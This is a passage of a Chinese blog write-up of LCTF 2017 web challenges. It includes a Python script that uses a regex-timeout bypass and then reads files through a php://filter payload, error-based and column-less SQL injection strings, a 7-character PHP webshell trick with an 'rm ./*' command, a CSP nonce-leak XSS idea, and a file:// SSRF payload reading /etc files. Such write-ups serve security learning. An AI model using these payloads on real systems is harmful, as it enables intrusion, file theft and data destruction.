+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sth</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT identity FROM identities WHERE username = :username&#x27;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">fetch</span>()[<span class="number">0</span>] === <span class="string">&#x27;GUEST&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_guest&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们在清空数据库是仍然保持登录状态，上面这个判断就不会成立，自然就绕过检测了。当然我们也可以跑脚本注册大量用户来加速清空数据库的操作。</p>
+</li>
+<li><p>正解</p>
+<p>说了这么多，终于来到正解了。问题出在<code>preg_match</code>函数。</p>
+<blockquote>
+<p>pre_match在匹配的时候会消耗较大的资源，并且默认使用贪婪匹配。所以通过输入一个超长的字符串去给pre_match匹配，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。</p>
+</blockquote>
+<p>直接写个脚本来跑吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">reg_url = <span class="string">&#x27;http://123.206.120.239/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://123.206.120.239/login.php&#x27;</span></span><br><span class="line">index_url = <span class="string">&#x27;http://123.206.120.239/member.php&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;seaii1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;xdsec###&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">100000</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(reg_url, data=data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;seaii1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">	s.post(login_url, data=data)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    login()</span><br><span class="line">    r = s.get(index_url + <span class="string">&#x27;?file=php://filter/read=convert.base64-encode/resource=config.php&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (r.text)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h4><p>member.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;is_logined&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_logined&#x27;</span>]) === <span class="literal">false</span> || <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_guest&#x27;</span>]) === <span class="literal">true</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])===<span class="literal">false</span>)</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;None&quot;</span>;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;you cannot give me a file&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.120.239/member.php?file=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure>
+
+<p>解码即可得到flag。</p>
+<h3 id="“他们”有什么秘密呢"><a href="#“他们”有什么秘密呢" class="headerlink" title="“他们”有什么秘密呢?"></a>“他们”有什么秘密呢?</h3><p>手快拿了个一血，美滋滋~</p>
+<p>访问<code>http://182.254.246.93/entrance.php</code>，查看源码获得提示。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171118/D9K1DH241a.png" alt="mark"></p>
+<p>简单测试了一下，union，select啥的都没过滤，可以报错。但是<code>information</code>、<code>table</code>、<code>column</code>等可以爆表爆列关键字被过滤了，而且过滤的很严格。</p>
+<p>但是可以通过报错来获得表名、列名</p>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and Polygon(pro_id)</span><br></pre></td></tr></table></figure>
+
+<p>之前积累的这个姿势被过滤了，在手册上寻找其他函数<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/gis-mysql-specific-functions.html#function_polygon">https://dev.mysql.com/doc/refman/5.7/en/gis-mysql-specific-functions.html#function_polygon</a>，找到一个漏网之鱼。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and LineString(pro_id)  </span><br></pre></td></tr></table></figure>
+
+<p>得到表名 product_2017ctf</p>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner,d067a0fa9dc61a6e))xxx)</span><br></pre></td></tr></table></figure>
+
+<p>得到列名pro_id,pro_name,owner,d067a0fa9dc61a6e。明显我们需要知道d067a0fa9dc61a6e的值，但是<code>d067a0fa9dc61a6e</code>被过滤了。</p>
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=-1 union select 1,d,3,4 from (select 1 a,2 b,3 c,4 d union select * from product_2017ctf limit 3,1)xxx</span><br></pre></td></tr></table></figure>
+
+<p>得到字段值为<code>7195ca99696b5a896.php</code>，进入下一关。</p>
+<h4 id="7字符限制获取webshell"><a href="#7字符限制获取webshell" class="headerlink" title="7字符限制获取webshell"></a>7字符限制获取webshell</h4><p>从网上找了一个参考<a target="_blank" rel="noopener" href="http://www.vuln.cn/6016">http://www.vuln.cn/6016</a>，大体思路就是php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`*`;</span><br></pre></td></tr></table></figure>
+
+<p>会将当前目录下所有文件的文件名放在一起当做一条命令执行。</p>
+<p>首先删除保存文件目录下的index.html，他会影响命令的执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=bash&amp;content=123</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=command&amp;content=rm ./*</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=z.php&amp;content=&lt;?=`*`;</span><br></pre></td></tr></table></figure>
+
+<p>之后只要修改command文件的内容执行命令就可以了。</p>
+<p><code>ls /</code>获得flag文件名：327a6c4304ad5938eaf0efb6cc3e53dc.php</p>
+<p><code>cat /3*</code>得到flag：LCTF{n1ver_stop_nev2r_giveup}</p>
+<h3 id="wanna-hack-him-（未做出）"><a href="#wanna-hack-him-（未做出）" class="headerlink" title="wanna hack him? （未做出）"></a>wanna hack him? （未做出）</h3><h4 id="nonce"><a href="#nonce" class="headerlink" title="nonce"></a>nonce</h4><p>看题目，标准的xss页面，在preview.php看到设置了csp</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171120/mc6CgaeLF7.png" alt="mark"></p>
+<p>目前针对csp-nonce的攻击大致有两种</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li>
+<li><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171120/l4aiLB1DBm.png" alt="mark"></li>
+</ol>
+<p>但是似乎都不太适合这个题目，后来发现<code>preview.php</code>的nonce并不是随机的，隔一段时间才会变，推测<code>admin_view.php</code>也会是这样。然后就僵住了。。。</p>
+<p>来看大佬wp，可以使用<code>&lt;img src=&#39;http://host/?nonce=</code>来获取nonce，src属性的单引号会和后面的<code>var test = &#39;test</code>闭合，就可以拿到nonce了。思路不够灵活，姿势不够猥琐呀。</p>
+<h4 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h4><p>这里有一点小坑，拿到nonce之后手动提交payload的话bot可能访问不到，需要写脚本一次提交多条payload。</p>
+<h4 id="拓展-UXSS"><a href="#拓展-UXSS" class="headerlink" title="拓展-UXSS"></a>拓展-UXSS</h4><p>后来看大佬wp说可以用uxss，第一次接触这个漏洞，惭愧。。。</p>
+<p>首先是一篇科普<a target="_blank" rel="noopener" href="http://www.fooying.com/uxss/">通用跨站脚本攻击(UXSS)</a></p>
+<p>接着是大佬的<a target="_blank" rel="noopener" href="http://www.au1ge.xyz/2017/11/20/lctf-2017-web-wp/">wp</a>，写的很详细。</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;华丽的分割线&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>这两题都是ssrf，让我对ssrf有了更深的理解，详细的会更新到另一篇文章中。</p>
+<h3 id="（伪）签到题-（未做出）"><a href="#（伪）签到题-（未做出）" class="headerlink" title="（伪）签到题 （未做出）"></a>（伪）签到题 （未做出）</h3><p>fuzz发现<code>://</code>后面必须是<code>www.baidu.com</code>，前面必须是字母数字和.。也就是说我们可以指定协议，知识点来了:</p>
+<blockquote>
+<p>curl是支持file:&#x2F;&#x2F;host&#x2F;path, file:&#x2F;&#x2F;path这两种形式, 但是<strong>即使有host, curl仍然会访问到本地的文件</strong></p>
+</blockquote>
+<p>还有一个点是要截断url末尾自动拼接的<code>/</code>，使用<code>?</code>当做get请求的参数，或者<code>#</code>变成锚点都可以。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://www.baidu.com/etc/flag?</span><br></pre></td></tr></table></figure>
+
+<p>也可以先读<code>/etc/passwd</code>，有一个lctf用户，<code>/home/lctf/</code>下也有flag。。。</p>
+<h3 id="L-PLAYGROUND-（未做出）"><a href="#L-PLAYGROUND-（未做出）" class="headerlink" title="L PLAYGROUND （未做出）"></a>L PLAYGROUND （未做出）</h3><p>这题官方wp写的很详细了，反正当时做的时候一脸懵逼。。。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LCTF/LCTF2017/blob/master/src/web/l-plarground/writeup.md">https://github.com/LCTF/LCTF2017/blob/master/src/web/l-plarground/writeup.md</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
